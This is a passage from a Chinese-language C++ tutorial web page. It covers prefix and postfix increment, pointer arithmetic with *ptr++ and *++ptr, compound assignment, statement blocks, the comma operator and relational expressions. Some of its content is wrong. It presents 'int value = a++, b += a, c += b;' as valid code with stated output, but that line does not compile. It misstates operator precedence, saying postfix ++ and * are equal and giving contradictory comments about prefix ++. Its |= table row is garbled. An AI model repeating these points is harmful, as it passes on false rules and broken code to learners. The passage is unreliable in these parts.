class="built_in">endl</span>; </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 使用前缀移动索引并获取值</span></span><br><span class="line">    index = <span class="number">0</span>; <span class="comment">// 重置 index</span></span><br><span class="line">    <span class="keyword">int</span> val2 = arr[++index]; <span class="comment">// index 先变为 1, val2 = arr[1] (20)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;val2 = &quot;</span> &lt;&lt; val2 &lt;&lt; <span class="string">&quot;, index = &quot;</span> &lt;&lt; index &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>性能建议:</strong> 对于内置类型（如 <code>int</code>, <code>double</code>, 指针），前缀和后缀的性能差异通常可以忽略。但对于用户定义的类类型（迭代器等），<strong>前缀形式 (<code>++it</code>) 通常比后缀形式 (<code>it++</code>) 效率更高</strong>，因为后缀形式需要创建一个临时对象来保存原始值。因此，在不需要使用原始值的情况下，养成优先使用前缀递增/递减的习惯是好的。</p><h2 id="5-1-8-递增-递减运算符和指针"><a href="#5-1-8-递增-递减运算符和指针" class="headerlink" title="5.1.8 递增/递减运算符和指针"></a>5.1.8 递增/递减运算符和指针</h2><p><code>++</code> 和 <code>--</code> 运算符可以应用于指针，其效果是使指针指向内存中的下一个或上一个<strong>元素</strong>。编译器会自动根据指针指向的数据类型的大小来调整地址。</p><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">double</span> arr[<span class="number">3</span>] = &#123;<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>&#125;;</span><br><span class="line">    <span class="keyword">double</span> *ptr = arr; <span class="comment">// ptr 指向 arr[0]</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Initial pointer: &quot;</span> &lt;&lt; ptr &lt;&lt; <span class="string">&quot;, value: &quot;</span> &lt;&lt; *ptr &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 指向 1.1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 前缀递增指针</span></span><br><span class="line">    ++ptr; </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After ++ptr:     &quot;</span> &lt;&lt; ptr &lt;&lt; <span class="string">&quot;, value: &quot;</span> &lt;&lt; *ptr &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 指向 2.2</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 后缀递增指针</span></span><br><span class="line">    ptr++;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After ptr++:     &quot;</span> &lt;&lt; ptr &lt;&lt; <span class="string">&quot;, value: &quot;</span> &lt;&lt; *ptr &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 指向 3.3</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 前缀递减指针</span></span><br><span class="line">    --ptr;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After --ptr:     &quot;</span> &lt;&lt; ptr &lt;&lt; <span class="string">&quot;, value: &quot;</span> &lt;&lt; *ptr &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 指向 2.2</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 后缀递减指针</span></span><br><span class="line">    ptr--;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After ptr--:     &quot;</span> &lt;&lt; ptr &lt;&lt; <span class="string">&quot;, value: &quot;</span> &lt;&lt; *ptr &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 指向 1.1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 结合解引用 (注意优先级)</span></span><br><span class="line">    ptr = arr; <span class="comment">// 重置</span></span><br><span class="line">    <span class="keyword">double</span> val;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// *ptr++ : 获取 ptr 当前指向的值，然后 ptr 指向下一个元素 (后缀 ++ 优先级高于 *)</span></span><br><span class="line">    val = *ptr++; </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;val = *ptr++ : val = &quot;</span> &lt;&lt; val &lt;&lt; <span class="string">&quot;, ptr now points to value &quot;</span> &lt;&lt; *ptr &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// val=1.1, ptr 指向 2.2</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// *++ptr : ptr 先指向下一个元素，然后获取新指向的值 (前缀 ++ 优先级高于 *)</span></span><br><span class="line">    ptr = arr; <span class="comment">// 重置</span></span><br><span class="line">    val = *++ptr;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;val = *++ptr : val = &quot;</span> &lt;&lt; val &lt;&lt; <span class="string">&quot;, ptr now points to value &quot;</span> &lt;&lt; *ptr &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// val=2.2, ptr 指向 2.2</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ++*ptr : 获取 ptr 指向的值，然后将该值加 1 (解引用 * 优先级高于前缀 ++)</span></span><br><span class="line">    ptr = arr; <span class="comment">// 重置</span></span><br><span class="line">    ++*ptr; <span class="comment">// 将 arr[0] 的值从 1.1 增加到 2.1</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After ++*ptr : arr[0] = &quot;</span> &lt;&lt; arr[<span class="number">0</span>] &lt;&lt; <span class="string">&quot;, ptr points to value &quot;</span> &lt;&lt; *ptr &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// arr[0]=2.1, ptr 指向 2.1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// (*ptr)++ : 获取 ptr 指向的值，然后将该值加 1 (括号强制先解引用)</span></span><br><span class="line">    ptr = arr; <span class="comment">// 重置</span></span><br><span class="line">    arr[<span class="number">0</span>] = <span class="number">1.1</span>; <span class="comment">// 恢复 arr[0]</span></span><br><span class="line">    (*ptr)++; <span class="comment">// 将 arr[0] 的值从 1.1 增加到 2.1</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After (*ptr)++: arr[0] = &quot;</span> &lt;&lt; arr[<span class="number">0</span>] &lt;&lt; <span class="string">&quot;, ptr points to value &quot;</span> &lt;&lt; *ptr &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// arr[0]=2.1, ptr 指向 2.1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>优先级:</strong> 解引用 <code>*</code> 和前/后缀 <code>++</code>/<code>--</code> 的优先级相同，结合性是从右到左。为了清晰起见，当结合使用时，使用括号 <code>()</code> 是个好主意，例如 <code>(*ptr)++</code>。</p><h2 id="5-1-9-组合赋值运算符"><a href="#5-1-9-组合赋值运算符" class="headerlink" title="5.1.9 组合赋值运算符"></a>5.1.9 组合赋值运算符</h2><p>C++ 提供了一组组合赋值运算符，将算术运算和赋值运算合并为一个运算符，使代码更简洁。</p><table><thead><tr><th align="left">运算符</th><th align="left">示例</th><th align="left">等价于</th></tr></thead><tbody><tr><td align="left"><code>+=</code></td><td align="left"><code>x += y</code></td><td align="left"><code>x = x + y</code></td></tr><tr><td align="left"><code>-=</code></td><td align="left"><code>x -= y</code></td><td align="left"><code>x = x - y</code></td></tr><tr><td align="left"><code>*=</code></td><td align="left"><code>x *= y</code></td><td align="left"><code>x = x * y</code></td></tr><tr><td align="left"><code>/=</code></td><td align="left"><code>x /= y</code></td><td align="left"><code>x = x / y</code></td></tr><tr><td align="left"><code>%=</code></td><td align="left"><code>x %= y</code></td><td align="left"><code>x = x % y</code></td></tr><tr><td align="left"><code>&amp;=</code></td><td align="left"><code>x &amp;= y</code></td><td align="left"><code>x = x &amp; y</code></td></tr><tr><td align="left">`</td><td align="left">=`</td><td align="left">`x</td></tr><tr><td align="left"><code>^=</code></td><td align="left"><code>x ^= y</code></td><td align="left"><code>x = x ^ y</code></td></tr><tr><td align="left"><code>&lt;&lt;=</code></td><td align="left"><code>x &lt;&lt;= y</code></td><td align="left"><code>x = x &lt;&lt; y</code></td></tr><tr><td align="left"><code>&gt;&gt;=</code></td><td align="left"><code>x &gt;&gt;= y</code></td><td align="left"><code>x = x &gt;&gt; y</code></td></tr></tbody></table><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> score = <span class="number">100</span>;</span><br><span class="line">    <span class="keyword">int</span> bonus = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">int</span> penalty = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">int</span> factor = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    score += bonus; <span class="comment">// score = score + bonus; score 变为 110</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Score after bonus: &quot;</span> &lt;&lt; score &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    score -= penalty; <span class="comment">// score = score - penalty; score 变为 105</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Score after penalty: &quot;</span> &lt;&lt; score &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    score *= factor; <span class="comment">// score = score * factor; score 变为 210</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Score after factor: &quot;</span> &lt;&lt; score &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    score /= <span class="number">3</span>; <span class="comment">// score = score / 3; score 变为 70 (整数除法)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Score after division: &quot;</span> &lt;&lt; score &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    score %= <span class="number">8</span>; <span class="comment">// score = score % 8; score 变为 6 (70 除以 8 余 6)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Score after modulo: &quot;</span> &lt;&lt; score &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在 for 循环更新中使用</span></span><br><span class="line">    <span class="keyword">int</span> total = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">5</span>; ++i) &#123;</span><br><span class="line">        total += i; <span class="comment">// 累加</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Total (1-5): &quot;</span> &lt;&lt; total &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 15</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>组合赋值运算符通常更易读，并且可能比分开写稍微高效一些。</p><h2 id="5-1-10-复合语句（语句块）"><a href="#5-1-10-复合语句（语句块）" class="headerlink" title="5.1.10 复合语句（语句块）"></a>5.1.10 复合语句（语句块）</h2><p><strong>复合语句 (Compound Statement)</strong> 或 <strong>语句块 (Block)</strong> 是由一对花括号 <code>&#123;&#125;</code> 括起来的零条或多条语句。</p><p><strong>作用:</strong></p><ul><li>  <strong>语法需要:</strong> 在 C++ 语法要求只能出现<strong>一条</strong>语句的地方（例如 <code>if</code>, <code>else</code>, <code>for</code>, <code>while</code> 的循环体），可以使用语句块来包含<strong>多条</strong>语句。</li><li>  <strong>创建作用域:</strong> 语句块会创建一个新的**局部作用域 (Local Scope)**。在块内声明的变量（自动存储变量）只在该块内部可见，并在块结束时销毁。</li></ul><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (x &gt; <span class="number">5</span>) &#123; <span class="comment">// if 后面需要一条语句，这里使用语句块</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;x is greater than 5.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">int</span> y = x * <span class="number">2</span>; <span class="comment">// y 只在 if 块内部可见</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Double x is: &quot;</span> &lt;&lt; y &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="comment">// y 在这里销毁</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; y; // 错误! y 在此作用域不可见</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Loop with block:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; ++i) &#123; <span class="comment">// for 循环体使用语句块</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; Outer loop i = &quot;</span> &lt;&lt; i &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">int</span> j = i + <span class="number">10</span>; <span class="comment">// j 只在 for 循环的当前迭代块内可见</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;  Inner variable j = &quot;</span> &lt;&lt; j &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="comment">// 每次迭代结束时 j 销毁</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="5-1-11-其他语法技巧——逗号运算符"><a href="#5-1-11-其他语法技巧——逗号运算符" class="headerlink" title="5.1.11 其他语法技巧——逗号运算符"></a>5.1.11 其他语法技巧——逗号运算符</h2><p><strong>逗号运算符 (<code>,</code>)</strong> 是 C++ 中优先级最低的运算符。它允许将两个表达式连接成一个表达式。</p><p><strong>行为:</strong></p><ol><li> 先计算逗号左侧的表达式。</li><li> <strong>丢弃</strong>左侧表达式的计算结果。</li><li> 然后计算逗号右侧的表达式。</li><li> 整个逗号表达式的结果是<strong>右侧表达式</strong>的值和类型。</li></ol><p><strong>主要用途:</strong></p><ul><li>  <strong><code>for</code> 循环的初始化和更新部分:</strong> 允许在这些部分执行多个操作，而不需要语句块。</li><li>  (较少见) 在需要单个表达式的地方执行多个有副作用的操作。</li></ul><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 在 for 循环中使用逗号运算符</span></span><br><span class="line">    <span class="keyword">int</span> i, j;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Using comma in for loop:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>, j = <span class="number">10</span>; <span class="comment">// 初始化: 初始化 i 和 j</span></span><br><span class="line">         i &lt; j;         <span class="comment">// 条件</span></span><br><span class="line">         ++i, --j)      <span class="comment">// 更新: 递增 i, 递减 j</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;i = &quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;, j = &quot;</span> &lt;&lt; j &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 逗号表达式的值</span></span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="keyword">int</span> result = (x = <span class="number">5</span>, x + <span class="number">10</span>); <span class="comment">// x 先被赋值为 5, 然后计算 x+10 (15)</span></span><br><span class="line">                                  <span class="comment">// 整个表达式的结果是 15</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Result of comma expression: &quot;</span> &lt;&lt; result &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 15</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;x after comma expression: &quot;</span> &lt;&lt; x &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;     <span class="comment">// 输出 5</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 优先级最低</span></span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">1</span>, b = <span class="number">2</span>, c = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">int</span> value = a++, b += a, c += b; <span class="comment">// 逗号优先级低于赋值</span></span><br><span class="line">    <span class="comment">// 这实际上等价于: value = a++; (value=1, a=2) 然后计算 b+=a (b=2+2=4), 然后计算 c+=b (c=3+4=7)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;value=&quot;</span> &lt;&lt; value &lt;&lt; <span class="string">&quot;, a=&quot;</span> &lt;&lt; a &lt;&lt; <span class="string">&quot;, b=&quot;</span> &lt;&lt; b &lt;&lt; <span class="string">&quot;, c=&quot;</span> &lt;&lt; c &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 value=1, a=2, b=4, c=7</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果想按顺序执行并取最后结果，需要括号</span></span><br><span class="line">    value = (++a, b += a, c += b); <span class="comment">// a=3, b=4+3=7, c=7+7=14. value=14</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;value=&quot;</span> &lt;&lt; value &lt;&lt; <span class="string">&quot;, a=&quot;</span> &lt;&lt; a &lt;&lt; <span class="string">&quot;, b=&quot;</span> &lt;&lt; b &lt;&lt; <span class="string">&quot;, c=&quot;</span> &lt;&lt; c &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 value=14, a=3, b=7, c=14</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然逗号运算符提供了这种能力，但过度使用可能降低代码的可读性。在 <code>for</code> 循环的初始化和更新部分是其最常见且合理的用途。</p><h2 id="5-1-12-关系表达式"><a href="#5-1-12-关系表达式" class="headerlink" title="5.1.12 关系表达式"></a>5.1.12 关系表达式</h2><p><strong>关系表达式 (Relational Expression)</strong> 使用关系运算符来比较两个操作数的值，其结果是一个布尔值 (<code>true</code> 或 <code>false</code>)。</p><p><strong>关系运算符:</strong></p><ul><li>  <code>&lt;</code> : 小于 (Less than)</li><li>  <code>&gt;</code> : 大于 (Greater than)</li><li>  <code>&lt;=</code>: 小于或等于 (Less than or equal to)</li><li>  <code>&gt;=</code>: 大于或等于 (Greater than or equal to)</li><li>  <code>==</code>: 等于 (Equal to)</li><li>  <code>!=</code>: 不等于 (Not equal to)</li></ul><p>这些运算符的优先级低于算术运算符，但高于赋值运算符。<code>==</code> 和 <code>!=</code> 的优先级低于其他四个关系运算符。</p><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> score = <span class="number">85</span>;</span><br><span class="line">    <span class="keyword">int</span> passing_score = <span class="number">60</span>;</span><br><span class="line">    <span class="keyword">double</span> temp1 = <span class="number">36.5</span>, temp2 = <span class="number">37.0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">bool</span> isPassing = (score &gt;= passing_score); <span class="comment">// 比较 score 是否大于等于 passing_score</span></span><br><span class="line">    <span class="keyword">bool</span> isFever = (temp1 &gt; temp2);          <span class="comment">// 比较 temp1 是否大于 temp2</span></span><br><span class="line">    <span class="keyword">bool</span> isEqual = (score == <span class="number">85</span>);            <span class="comment">// 比较 score 是否等于 85</span></span><br><span class="line">    <span class="keyword">bool</span> isNotEqual = (temp1 != temp2);      <span class="comment">// 比较 temp1 是否不等于 temp2</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::boolalpha; <span class="comment">// 使 bool 输出为 true/false</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Score: &quot;</span> &lt;&lt; score &lt;&lt; <span class="string">&quot;, Passing Score: &quot;</span> &lt;&lt; passing_score &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Is passing? &quot;</span> &lt;&lt; isPassing &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;   <span class="comment">// 输出 true</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Is fever? &quot;</span> &lt;&lt; isFever &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;     <span class="comment">// 输出 false</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Is score 85? &quot;</span> &lt;&lt; isEqual &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;    <span class="comment">// 输出 true</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Temps not equal? &quot;</span> &lt;&lt; isNotEqual &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 true</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在循环条件中使用</span></span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (count &lt; <span class="number">3</span>) &#123; <span class="comment">// 当 count 小于 3 时循环</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Count is &quot;</span> &lt;&lt; count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="5-1-13-赋值、比较和可能犯的错误"><a href="#5-1-13-赋值、比较和可能犯的错误" class="headerlink" title="5.1.13 赋值、比较和可能犯的错误"></a>5.1.13 赋值、比较和可能犯的错误</h2><p>一个非常常见的 C++ 编程错误是将<strong>赋值运算符 (<code>=</code>)</strong> 误用在需要<strong>比较运算符 (<code>==</code>)</strong> 的地方，尤其是在 <code>if</code> 或 <code>while</code> 的条件语句中。</p><ul><li><p><code>if (x = 5)</code>: 这不是比较 <code>x</code> 是否等于 5。它的作用是：</p><ol><li> 将 5 赋给变量 <code>x</code>。</li><li> 整个赋值表达式 <code>(x = 5)</code> 的结果是赋给 <code>x</code> 的值，即 5。</li><li>在 <code>if</code> 条件中，非零值被视为 <code>true</code>。<br>因此，这个 <code>if</code> 语句<strong>总是</strong>会执行其代码块（除非 5 被视为 false，这在 C++ 中不会发生），并且还会意外地将 <code>x</code> 的值修改为 5。</li></ol></li><li><p>  <code>if (x == 5)</code>: 这才是正确的比较，检查 <code>x</code> 的当前值是否等于 5，结果为 <code>true</code> 或 <code>false</code>，并且<strong>不会</strong>修改 <code>x</code> 的值。</p></li></ul><p><strong>示例:</strong></p><figure class="highlight cpp"><table><tr><td 